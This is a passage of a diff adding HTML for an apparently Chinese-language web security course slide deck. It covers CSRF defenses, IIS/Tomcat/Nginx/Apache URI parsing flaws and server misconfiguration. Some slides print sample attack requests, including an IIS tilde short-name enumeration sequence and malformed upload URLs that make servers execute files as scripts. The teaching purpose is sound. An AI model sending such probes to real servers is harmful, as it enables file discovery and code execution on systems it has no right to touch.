+<li>只需在请求中设置一个攻击者所无法伪造的、不可预测的 <code>token</code>，且保证这个 <code>token</code> 与 <code>Cookie</code> 是毫无关联的</li>
+<li>此外，还应保证这个 <code>token</code> 是独立且不重复使用的</li>
+<li>在服务端验证用户身份时应同时对 <code>Cookie</code> 及 <code>token</code> 进行验证
+<ul>
+<li>这个 <code>token</code> 被称为 <code>csrftoken</code>，在 HTML 的表单中，该字段的输入域往往是隐藏的</li>
+</ul></li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-csrf-3" class="slide level2">
+<h2>防御 CSRF</h2>
+<ol start="3" type="1">
+<li>在 HTTP 头中自定义属性并验证</li>
+</ol>
+<ul>
+<li>自定义属性的方法也是使用 token 并进行验证，和前一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 <code>HTTP Header</code> 中自定义的属性里</li>
+<li>当前一种方法实现不便的情况下，可以采用这种安全策略进行系统加固</li>
+</ul>
+</section>
+<section id="prevention-to-csrf-4" class="slide level2">
+<h2>防御 CSRF</h2>
+<ol start="4" type="1">
+<li>添加验证码并验证</li>
+</ol>
+<ul>
+<li>可以在表单中增加随机验证码，采用强制用户与 Web 应用进行交互的方式防止 CSRF 攻击
+<ul>
+<li>登录验证、交易等针对危险操作的接口</li>
+<li>但强制所有请求都使用验证码往往也是不现实的</li>
+</ul></li>
+<li>在实战中， Web 程序往往采用在 POST 请求中添加 token 作为参数并验证的方法作为防止 CSRF 漏洞的安全策略
+<ul>
+<li>禁止将 <code>csrftoken</code> 作为 GET 参数进行请求，防止请求地址被记录到浏览器的地址栏，也防止 token 通过 Referer 泄露到其他网站</li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-csrf-5" class="slide level2">
+<h2>防御 CSRF</h2>
+<p>以上 4 条防御方法通常是「组合使用」，而不是「单一」应用。</p>
+</section>
+</section>
+<section>
+<section id="平台相关漏洞" class="title-slide slide level1">
+<h1>平台相关漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>Web 服务器 URI 解析类漏洞</li>
+<li>不当配置缺陷</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="web-svr-uri-parse-vul" class="title-slide slide level1">
+<h1>16. Web 服务器 URI 解析类漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>在 <code>文件上传</code> 漏洞一节我们介绍过了 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547">CVE-2013-4547</a> 这个 Nginx 文件名解析逻辑漏洞。</li>
+<li>下面我们按照 URI 解析类漏洞造成的影响效果进行分类介绍</li>
+</ul>
+</section>
+<section id="目录遍历或信息泄漏" class="slide level2">
+<h2>目录遍历或信息泄漏</h2>
+<ul>
+<li>2012 年 6 月知名 Web 安全专家 Soroush Dalili 公布了微软 IIS 服务器在<a href="https://soroush.secproject.com/blog/2012/06/microsoft-iis-tilde-character-vulnerabilityfeature-short-filefolder-name-disclosure/">处理 <code>~</code> 字符时的缺陷</a>导致服务器上任意文件可被枚举探测存在性
+<ul>
+<li>这个漏洞存在的根本原因是微软在 DOS 时代设计的针对长文件名的自动缩短 <code>8.3</code> 命名规则</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="命名规则的一次滥用过程"><code>8.3</code> 命名规则的一次滥用过程</h3>
+<ul>
+<li>例如，文件名 <code>exampletest.txt</code> 按照 <code>8.3</code> 命名规则会被自动转换为 <code>EXAMPL~1.txt</code>。如果此时该目录下存在另一个文件名 <code>examplefile.txt</code>，则按照 <code>8.3</code> 命名规则该文件会被自动转换为 <code>EXAMPL~2.TXT</code></li>
+<li>注意，<code>8.3</code> 规则命名的文件和原文件名是等价的，操作系统会负责解析加载 <code>8.3</code> 规则命名的正确文件</li>
+<li>攻击者为了探测服务器上是否存在一个名为 <code>exampletest.txt</code> 的文件，可以采用如下步骤发送 HTTP GET 请求进行枚举探测：</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<pre class="c"><code>http:/example.com/*~1*/.aspx
+// 如果服务器返回状态码 404 说明服务器上存在不止一个 8.3 命名规则的文件
+
+http:/example.com/e*~1*/.aspx
+// 如果服务器返回状态码 404 说明服务器上存在不止一个字母 e 开头的文件
+
+http:/example.com/eb*~1*/.aspx
+// 如果服务器返回状态码 400 说明服务器上不存在字母 eb 开头的文件
+
+http:/example.com/ex*~1*/.aspx
+// 如果服务器返回状态码 404 说明服务器上存在不止一个字母 ex 开头的文件
+
+// 如此不断增加探测字符串长度即可完成指定服务器文件的枚举探测</code></pre>
+</section>
+<section class="slide level2">
+
+<h3 id="tomcat-4.x-source-leak">Tomcat 4.x 时代的 JSP 源代码泄漏漏洞</h3>
+<ul>
+<li>漏洞起因在于 Windows 平台上的文件名是不区分大小写的，但 Java 运行环境中对于文件名是区分大小写的</li>
+<li>Tomcat 4.x 的默认 URI 解析映射规则是对于 <code>.jsp</code> 扩展名的文件请求会在服务器端解析执行 JSP 代码后再输出结果给浏览器</li>
+<li>但如果客户端访问的文件扩展名是 <code>.JSP</code> 时，只要该文件路径在 Windows 系统上确实存在有效，但由于不是 Tomcat 的 JSP 引擎所期望的全小写字母，则会按照默认的文本文件处理，即直接读取文件内容并输出返回给浏览器，从而导致 JSP 源代码泄漏</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>故意访问一个不存在页面，借助服务器报错信息我们确认 Tomcat 版本是 4.1.27，存在该漏洞</p>
+</blockquote>
+<p><img data-src="images/chap0x07/tomcat-information-disclosure-2.png" /></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>访问 <code>.JSP</code> 扩展名时服务器直接泄漏了源代码</p>
+</blockquote>
+<p><img data-src="images/chap0x07/tomcat-information-disclosure-1.jpg" /></p>
+</section>
+<section id="code-exec-in-web-infrastructure" class="slide level2">
+<h2>代码执行</h2>
+<ul>
+<li>上述 <code>CVE-2013-4547</code> 漏洞就可以导致 Web 服务器将非脚本文件扩展名对应的文件当作服务端脚本解析并执行
+<ul>
+<li><code>IIS 5.x/6.0 解析漏洞</code></li>
+<li><code>IIS 6.0 文件解析漏洞</code></li>
+<li><code>IIS 7.0/IIS 7.5/ Nginx &lt; 0.8.3 畸形 URI 解析漏洞</code></li>
+<li><code>Apache 解析漏洞</code></li>
+</ul></li>
+</ul>
+</section>
+<section id="代码执行示例" class="slide level2">
+<h2>代码执行示例</h2>
+<pre class="bash"><code># IIS 5.x/6.0 解析漏洞
+# 在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被 IIS 当作脚本文件来解析并执行
+http://www.vul.com/vul.asp/vul.jpg
+
+# IIS 6.0 文件解析漏洞
+# IIS 6.0 分号后面的数据不被解析，也就是说 vul.asp;.jpg 将被当做 vul.asp 解析并执行
+http://www.vul.com/vul.asp;.jpg
+
+# IIS 7.0/IIS 7.5/ Nginx &lt; 0.8.3 畸形 URI 解析漏洞
+# 在默认 Fast-CGI 开启状况下，访问以下网址，服务器将把 vul.jpg 文件当做 PHP 解析并执行
+http://www.vul.com/vul.jpg/vul.php
+
+# Apache 解析漏洞
+# Apache 对文件解析是从右到左开始判断解析。如果文件的扩展名没有配置默认的处理程序，就再往左判断解析。 如 vul.php.owf.rar，由于Apache无法解析 rar 和 owf 扩展名，但能够解析 php 扩展名，因此 Apache 会将 vul.php.owf.rar 当做 PHP 代码进行解析并执行
+http://www.vul.com/vul.php.owf.rar</code></pre>
+</section>
+<section id="拒绝服务" class="slide level2">
+<h2>拒绝服务</h2>
+<ul>
+<li>还是前述 <code>8.3 命名规则滥用漏洞</code>，精心构造的包含一堆 <code>~</code> 字符的 URI 请求还可以导致 <a href="http://soroush.secproject.com/downloadable/iis_tilde_dos.txt">.NET 框架拒绝服务</a></li>
+<li>类似的漏洞还有如 Apache 的<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1303">CVE-2018-1303</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2015-0253">CVE-2015-0253</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2004-0786">CVE-2004-0786</a> 等等</li>
+</ul>
+</section>
+<section id="prevention-to-web-svr" class="slide level2">
+<h2>防御 Web 服务器 URI 解析类漏洞</h2>
+<ul>
+<li>升级版本</li>
+<li>根据官方漏洞通告自己对存在漏洞的服务器打补丁</li>
+<li>如果在不确定版本升级或打补丁是否会对运行在服务器上的代码带来兼容性方面的负面影响，还可以通过部署防火墙、入侵检测系统和应用防火墙等第三方安全系统来 <strong>缓解</strong></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="cce" class="title-slide slide level1">
+<h1>17. 不当配置缺陷</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li><code>IIS 7.0/IIS 7.5/ Nginx &lt; 0.8.3 畸形 URI 解析漏洞</code></li>
+<li>MySQL 的 <code>secure_file_priv</code> 参数正确配置对 SQL 注入时利用 DNS 进行带外数据传输的拦截作用</li>
+</ul>
+<p>以上 2 个例子分别体现了错误的服务配置和正确的服务配置在提升系统安全性方面的截然不同的两种效果</p>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>Nginx 的这个 URI 解析漏洞在不升级版本的情况下，实际只需要通过配置 <code>cgi.fix_pathinfo=0</code> 即可封堵上这个解析漏洞</li>
+<li>如果需要自己通过配置的方式加固服务器基础软件（如 Web 服务器），强烈建议阅读官方文档中有关安全加固的内容</li>
+<li>对于现代流行的服务器基础软件，大多数在发布的时候已经注意到遵循 <code>默认安全（secure by default）</code>理念去保证默认配置的安全性</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>⚠️ ⚠️ ⚠️ <strong>需要特别注意的是</strong> ⚠️ ⚠️ ⚠️</p>
+<ul>
+<li>类似 <a href="https://www.apachefriends.org/">XAMPP</a> 这样的面向开发环境而非生产环境的一键式基础服务软件安装配置工具所提供的缺省配置往往不能直接应用于生产环境
+<ul>
+<li>其默认配置是面向开发调试环境优化的，很多情况下会默认开启调试模式和允许更详细和丰富的错误日志信息回显等
+<ul>
+<li>以上这些都是在生产环境中需要极力规避的危险设置</li>
+</ul></li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="延伸阅读" class="title-slide slide level1">
+<h1>延伸阅读</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li><a href="http://vinc.top/2016/08/25/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">【代码审计】PHP文件包含漏洞利用总结</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF Wiki</a></li>
+</ul>
+</section>
+</section>
+    </div>
+  </div>
+
+  <script src="lib/reveal.js/lib/js/head.min.js"></script>
+  <script src="lib/reveal.js/js/reveal.js"></script>
+
+  <script>
+
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        // Display the page number of the current slide
+        slideNumber: true,
+        // Push each slide change to the browser history
+        history: true,
+        // Transition style
+        transition: 'fade', // none/fade/slide/convex/concave/zoom
+        math: {
+          mathjax: '',
+          config: 'TeX-AMS_HTML-full',
+          tex2jax: {
+            inlineMath: [['\\(','\\)']],
+            displayMath: [['\\[','\\]']],
+            balanceBraces: true,
+            processEscapes: false,
+            processRefs: true,
+            processEnvironments: true,
+            preview: 'TeX',
+            skipTags: ['script','noscript','style','textarea','pre','code'],
+            ignoreClass: 'tex2jax_ignore',
+            processClass: 'tex2jax_process'
+          },
+        },
+  multiplex: {
+    secret: null, //【TO REPLACE】 null so the clients do not have control of the master presentation
+    id: '', // 【TO REPLACE】socketId, obtained from socket.io server
+    url: ''  //【TO REPLACE】Location of your socket.io server
+  },
+
+menu: {
+		// Specifies which side of the presentation the menu will 
+		// be shown. Use 'left' or 'right'.
+		side: 'left',
+
+		// Specifies the width of the menu.
+		// Can be one of the following:
+		// 'normal', 'wide', 'third', 'half', 'full', or
+		// any valid css length value
+		width: 'normal',
+
+		// Add slide numbers to the titles in the slide list.
+		// Use 'true' or format string (same as reveal.js slide numbers)
+		numbers: true,
+
+		// Specifies which slide elements will be used for generating
+		// the slide titles in the menu. The default selects the first
+		// heading element found in the slide, but you can specify any
+		// valid css selector and the text from the first matching
+		// element will be used.
+		// Note: that a section data-menu-title attribute or an element
+		// with a menu-title class will take precedence over this option
+		titleSelector: 'h1, h2, h3, h4, h5, h6',
+
+		// If slides do not have a matching title, attempt to use the
+		// start of the text content as the title instead
+		useTextContentForMissingTitles: false,
+
+		// Hide slides from the menu that do not have a title.
+		// Set to 'true' to only list slides with titles.
+		hideMissingTitles: false,
+
+		// Adds markers to the slide titles to indicate the 
+		// progress through the presentation. Set to 'false'
+		// to hide the markers.
+		markers: true,
+
+		// Specify custom panels to be included in the menu, by
+		// providing an array of objects with 'title', 'icon'
+		// properties, and either a 'src' or 'content' property.
+		custom: false,
+
+		// Specifies the themes that will be available in the themes
+		// menu panel. Set to 'true' to show the themes menu panel
+		// with the default themes list. Alternatively, provide an
+		// array to specify the themes to make available in the
+		// themes menu panel, for example...
+		// [
+		//     { name: 'Black', theme: 'css/theme/black.css' },
+		//     { name: 'White', theme: 'css/theme/white.css' },
+		//     { name: 'League', theme: 'css/theme/league.css' }
+		// ]
+		themes: false,
+
+		// Specifies the path to the default theme files. If your
+		// presentation uses a different path to the standard reveal
+		// layout then you need to provide this option, but only
+		// when 'themes' is set to 'true'. If you provide your own 
+		// list of themes or 'themes' is set to 'false' the 
+		// 'themesPath' option is ignored.
+		themesPath: 'css/theme/',
+
+		// Specifies if the transitions menu panel will be shown.
+		// Set to 'true' to show the transitions menu panel with
+		// the default transitions list. Alternatively, provide an
+		// array to specify the transitions to make available in
+		// the transitions panel, for example...
+		// ['None', 'Fade', 'Slide']
+		transitions: false,
+
+		// Adds a menu button to the slides to open the menu panel.
+		// Set to 'false' to hide the button.
+		openButton: true,
+
+		// If 'true' allows the slide number in the presentation to
+		// open the menu panel. The reveal.js slideNumber option must 
+		// be displayed for this to take effect
+		openSlideNumber: false,
+
+		// If true allows the user to open and navigate the menu using
+		// the keyboard. Standard keyboard interaction with reveal
+		// will be disabled while the menu is open.
+		keyboard: true,
+
+		// Normally the menu will close on user actions such as
+		// selecting a menu item, or clicking the presentation area.
+		// If 'true', the sticky option will leave the menu open
+		// until it is explicitly closed, that is, using the close
+		// button or pressing the ESC or m key (when the keyboard 
+		// interaction option is enabled).
+		sticky: false,
+
+		// If 'true' standard menu items will be automatically opened
+		// when navigating using the keyboard. Note: this only takes 
+		// effect when both the 'keyboard' and 'sticky' options are enabled.
+		autoOpen: true,
+
+		// If 'true' the menu will not be created until it is explicitly
+		// requested by calling RevealMenu.init(). Note this will delay
+		// the creation of all menu panels, including custom panels, and
+		// the menu button.
+		delayInit: false,
+
+		// If 'true' the menu will be shown when the menu is initialised.
+		openOnInit: false,
+
+		// By default the menu will load it's own font-awesome library
+		// icons. If your presentation needs to load a different
+		// font-awesome library the 'loadIcons' option can be set to false
+		// and the menu will not attempt to load the font-awesome library.
+		loadIcons: true
+	},
+
+
+        // Optional reveal.js plugins
+        dependencies: [
+          { src: 'lib/reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          { src: 'lib/reveal.js/plugin/zoom-js/zoom.js', async: true },
+          { src: 'lib/reveal.js/plugin/math/math.js', async: true },
+          { src: 'lib/reveal.js/plugin/menu/menu.js'},
+          { src: 'lib/reveal.js/plugin/markdown/marked.js'},
+          { src: 'lib/reveal.js/plugin/markdown/markdown.js'},
+          { src: 'lib/reveal.js/plugin/search/search.js'},
+          { src: 'lib/reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+          { src: 'lib/reveal.js/plugin/notes/notes.js', async: true },
+          { src: 'lib/reveal.js/plugin/socket.io/socket.io.js', async: true },
+          { src: 'lib/reveal.js/plugin/multiplex/master.js', async: true },
+          { src: 'lib/reveal.js/plugin/multiplex/client.js', async: true },
+        ]
+      });
+    </script>
+    </body>
+</html>
